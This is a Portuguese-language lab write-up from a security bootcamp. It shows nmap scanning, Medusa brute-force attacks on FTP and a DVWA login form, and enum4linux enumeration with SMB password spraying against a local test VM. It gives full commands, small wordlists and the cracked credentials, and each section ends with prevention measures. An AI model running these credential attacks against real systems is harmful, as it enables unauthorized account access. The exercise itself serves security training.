# Desafio Hacking Ético
Desafio do curso hacker ético do bootcamp  de segurança da Riachuelo - 
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Atividade - Ataque de força bruta em FTP 
Executei o comando para verificar se a portas utilizadas pelo serviço FTP e SMB estavam abertas e a versão do serviço:
nmap -sV -p 21,139,445 192.168.56.102        
Recebi o resultado abaixo:     
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:79:6D:60 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix
Confirmei que o serviço de FTP está ativo no servidor 192.168.56.102
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali):

Criei a wordlist de Usuários e Senhas para realizar o força bruta.
Comando para criar o arquivo de usuários 
echo -e "user\nmsfadmin\nadmin\root" > users.txt
Comando para criar o arquivo de usuários                                                                          
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

comando executando o ataque 
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
Resultado informando que tive êxito em identificar a senha:
2026-03-07 19:55:44 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]

Medidas de prevenção:
Desativar serviços desnecessários, que não está sendo utilizado.
Utilizar protocolos mais seguros com autenticação forte.
Utilizar políticas de senhas complexas, alterar constantemente 
Bloqueios por meio de tentativas
Manter os serviços atualizados.
Autenticação multifator (MFA)


Atividade - Ataque de automação de tentativas em formulário web (DVWA) 
Acessar o site abaixo:
http://192.168.56.102/dvwa/login.php
1 passo. Acessar a barra de desenvolvedor do navegador e fazer uma tentativa com um usuário e senha aleatória. Fazendo esse texto vou verificar qual o parâmetros que o site utiliza.
2 passo – criar wordlist para executar o ataque
Lista de Users
echo -e "user\nmsfadmin\nadmin\root" > users.txt
Lista de Passwords
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
Executando o ataque
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \  -m PAGE:'/dvwa/login.php' \  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \  -m 'FAIL=Login failed' -t 6

sucesso na obtenção da senhas 
2026-03-08 11:06:21 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2026-03-08 11:06:21 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
oot (3 of 3, 2 complete) Password: 123456 (1 of 4 complete)102 (1 of 1, 0 complete) User: admin
oot Password: 123456 [SUCCESS]UND: [http] Host: 192.168.56.102 User: admin
2026-03-08 11:06:21 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2026-03-08 11:06:21 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
2026-03-08 11:06:21 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: msfadmin (1 of 4 complete)
2026-03-08 11:06:21 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
2026-03-08 11:06:22 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 5 complete) Password: qwerty (2 of 4 complete)
2026-03-08 11:06:22 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: qwerty [SUCCESS]
2026-03-08 11:06:22 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 6 complete) Password: 123456 (3 of 4 complete)
2026-03-08 11:06:22 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: 123456 [SUCCESS]
2026-03-08 11:06:22 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 7 complete) Password: password (4 of 4 complete)
2026-03-08 11:06:22 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: password [SUCCESS]

Medidas de prevenção:
Limites de tentativas por IP com bloqueios temporários.
Utilizar captchar.
Autenticação MFA
Monitorização de logs com alertas


Atividade - Ataque password spraying em SMB com enumeração de usuários
Utilizar ferramenta para identificar e localizar user, password, group no servidor.
enum4linux -a 192.168.56.102 | tee enum4_output.txt    
Abrir o arquivo gerado com usuários e grupos obtidos.
less enum4_output.txt
Criar a wordlist de usuários 
echo -e "user\nmsfadmin\nservice" > smb_users.txt
Criar a wordlist de senhas
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

Executando a ferramenta Medusa
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Validando o sucesso com usuário e senha obtida.

Medidas de prevenção:
Utilizar senhas fortes, complexas e expiradas regulamente.
Autenticação multifator MFA
Bloqueio de IPs após múltiplas tentativas de login
Monitoramento inteligente de logs e comportamentos.
Segmentação da rede. Serviços internos não deve ser exposto abertamente.
Auditoria regulares com ferramentas. 

